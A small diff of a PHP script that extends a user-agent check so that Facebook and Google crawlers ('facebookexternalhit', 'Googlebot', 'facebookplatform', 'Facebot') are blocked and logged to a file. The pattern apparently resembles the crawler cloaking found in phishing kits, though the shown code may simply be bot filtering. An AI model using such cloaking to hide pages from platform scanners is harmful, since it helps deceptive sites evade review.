@@ -206,7 +206,7 @@ $ip =  ip2long($_SERVER[\'REMOTE_ADDR\']);
 
 if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
- strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false) {
+ strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "facebookplatform") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false) {
   $fAgent = fopen($blockedAgents, \'a\');
   $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] .\' blocked \' . PHP_EOL;
   fwrite($fAgent, $agent);
